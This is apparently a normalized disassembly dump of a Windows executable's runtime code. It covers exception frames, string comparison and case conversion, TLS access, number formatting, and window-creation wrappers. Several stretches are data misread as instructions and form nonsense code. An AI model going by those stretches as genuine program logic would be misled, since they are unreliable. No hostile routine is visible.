mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405d5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405dfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404008
mov eax ebx
xor edx edx
call sub_40488c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e02
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_404880
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404654
mov eax ebx
call sub_404880
push eax
mov eax [ ebp - 0x4 ]
call sub_4042c8
inc eax
push eax
mov eax ebx
call sub_404870
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
pop ecx
pop edx
call sub_405b48
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404654
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40405c
sub_405e08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404714
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ea6
lea eax [ ebp - 0x4 ]
call sub_404714
retn
mov eax ebx
call sub_4042c8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40495c
mov eax ebx
call sub_4042c8
push eax
mov eax [ ebp - 0x4 ]
call sub_404880
inc eax
push eax
mov eax ebx
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_404870
pop ecx
pop edx
call sub_405c24
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404714
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40495c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404750
sub_405eac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405eef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404860
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405d5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ef6
lea eax [ ebp - 0x4 ]
call sub_404714
retn
sub_405efc
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404200
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405468
push eax
call sub_40136c
mov ecx eax
mov edx esp
mov eax esi
call sub_4040f8
jmp r-xdata
sub_405f54
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405fba
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401334
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404278
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c60
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fc1
lea eax [ ebp - 0x10 ]
call sub_404008
retn
xor ebx ebx
sub_405fc8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406012
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406019
retn
mov eax rw-data
call sub_402a9c
mov eax rw-data
call sub_402a9c
mov eax rw-data
call sub_402a9c
call sub_401ba0
sub_40601c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404e54
call sub_40306c
test al al
je r-xdata
call sub_403160
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013ec
mov [ rw-data ] eax
call sub_4013e4
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40309c
call sub_40135c
call sub_405f54
mov [ rw-data ] eax
call sub_4013e4
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40135c
call sub_405f54
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4013dc
mov [ rw-data ] eax
sub_406124
push ebx
call sub_40611c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_406110
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f78
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f78
sub_406168
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_406124
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_4061b4
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_4060f0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_4061a8
mov edx rw-data
mov eax ebx
call sub_403ccc
pop ebx
retn
sub_4061f8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40621d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406224
retn
sub_406254
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406270
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406295
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40629c
retn
sub_4062a8
lodsb [ esi ]
bound eax [ eax ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
test al 0x62
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
adc ecx [ eax ]
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec eax
add [ ebx + 0x5c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
push esp
adc ecx [ eax ]
mov eax eax
jmp [ EnterCriticalSection@IAT ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
add [ ebx + 0x4825ffc0 ] cl
adc ecx [ eax ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x6425ffc0 ] cl
adc ecx [ eax ]
mov eax eax
jmp [ CreateEventA@IAT ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
pop esp
arpl [ eax ] ax
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x5825ffc0 ] cl
adc ecx [ eax ]
mov eax eax
jmp [ DeleteCriticalSection@IAT ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
add ebp [ eax - 0x74ffbf9e ]
sar bh 0x25
cmp [ edx ] dl
dec eax
add [ ebx + 0x3425ffc0 ] cl
adc cl [ eax ]
mov eax eax
jmp [ RegQueryValueExA@IAT ]
sub_406e1c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029f4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029e4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406e74
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_4029f4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_4029e4
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406ecc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406fc1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406fe9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ff0
retn
sub_406ffc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407021
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407028
retn
sub_407034
push 0xf0004806
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh dh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh bh
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh ah
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh ch
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh dl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh bl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh al
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add al cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add cl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bl cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ah cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add ch cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add dh cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add bh cl
inc [ eax ]
add [ eax + 0x6 ] ch
dec eax
add [ eax + 0x680000ff ] dh
push es
dec eax
add [ ecx + 0x680000ff ] dh
push es
dec eax
add [ edx + 0x680000ff ] dh
push es
dec eax
add [ ebx + 0x680000ff ] dh
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] dh
dec eax
add [ ebp + 0x680000ff ] dh
push es
dec eax
add [ esi + 0x680000ff ] dh
push es
dec eax
add [ edi + 0x680000ff ] dh
push es
dec eax
add [ eax + 0x680000ff ] bh
push es
dec eax
add [ ecx + 0x680000ff ] bh
push es
dec eax
add [ edx + 0x680000ff ] bh
push es
dec eax
add [ ebx + 0x680000ff ] bh
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] bh
dec eax
add [ ebp + 0x680000ff ] bh
push es
dec eax
add [ esi + 0x680000ff ] bh
push es
dec eax
add [ edi + 0x680000ff ] bh
push es
dec eax
add [ eax + 0x680000ff ] ah
push es
dec eax
add [ ecx + 0x680000ff ] ah
push es
dec eax
add [ edx + 0x680000ff ] ah
push es
dec eax
add [ ebx + 0x680000ff ] ah
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] ah
dec eax
add [ ebp + 0x680000ff ] ah
push es
dec eax
add [ esi + 0x680000ff ] ah
push es
dec eax
add [ edi + 0x680000ff ] ah
push es
dec eax
add [ eax + 0x680000ff ] ch
push es
dec eax
add [ ecx + 0x680000ff ] ch
push es
dec eax
add [ edx + 0x680000ff ] ch
push es
dec eax
add [ ebx + 0x680000ff ] ch
push es
dec eax
add [ edi + edi * 8 + 0x6680000 ] ch
dec eax
add [ ebp + 0x680000ff ] ch
push es
dec eax
add [ esi + 0x680000ff ] ch
push es
dec eax
add [ edi + 0x680000ff ] ch
push es
dec eax
add [ eax + 0x680000ff ] dl
push es
dec eax
add [ ecx + 0x550000ff ] dl
mov ebp esp
xor eax eax
push ebp
push sub_407369
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407370
retn
sub_407e68
dec ecx
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x7e ] dl
inc eax
add [ ebp + 0x7e ] bl
inc eax
add [ ecx ] ch
jle r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ edx + edx ] ch
inc eax
add [ esp + esi + 0x40 ] bh
add [ eax - 0x3bffbfa6 ] bh
pop edx
inc eax
add [ eax - 0x7bffbfcc ] dl
xor al 0x40
add ah dl
pop edx
inc eax
add al ch
xor [ eax ] eax
fcom st2
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] dh
jle r-xdata
mov eax eax
push ebx
pop ebx
cmp eax [ eax ]
add al ch
push esi
mov edx 0x5e5fffff
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
jle r-xdata
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
pop ebx
retn
call sub_40bac0
call sub_4039c0
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add al dh
jle r-xdata
add [ ecx + 0x7e ] al
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
insb
jne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407e683f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx ebx
call sub_402c40
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40279c
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_407f18
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407f4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
pop edi
pop esi
pop ebx
retn
sub_407f70
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40279c
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c40
mov eax esi
pop esi
pop ebx
retn
sub_407f90
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4027bc
call ebx
pop ebx
retn
sub_407fbc
push ebx
mov ebx eax
mov eax 0xc
call sub_40279c
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407f90
pop ebx
retn
sub_407ff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404654
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_408030
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404654
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_40806c
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_40809c
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_4080bc
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_408110
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_4080bc
test eax eax
jne r-xdata
sub_408134
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax esi
call sub_4044c8
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040f8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408168
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042c8
mov ebx eax
mov eax esi
call sub_4044c8
mov edx eax
mov eax edi
mov ecx ebx
call sub_4040f8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_40819c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4081d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042c8
push eax
mov eax esi
call sub_4044c8
push eax
mov eax ebx
call sub_4042c8
push eax
mov eax ebx
call sub_4044c8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408224
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408244
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042c8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404008
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404528
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408294
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042c8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042c8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_4082f8
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40830e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40830e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40830e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408344
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_4082f8
mov edx esi
pop eax
call sub_4040f8
add esp 0x10
pop esi
retn
sub_408364
or cl cl
jne sub_408398
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408398
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408398
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408398
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
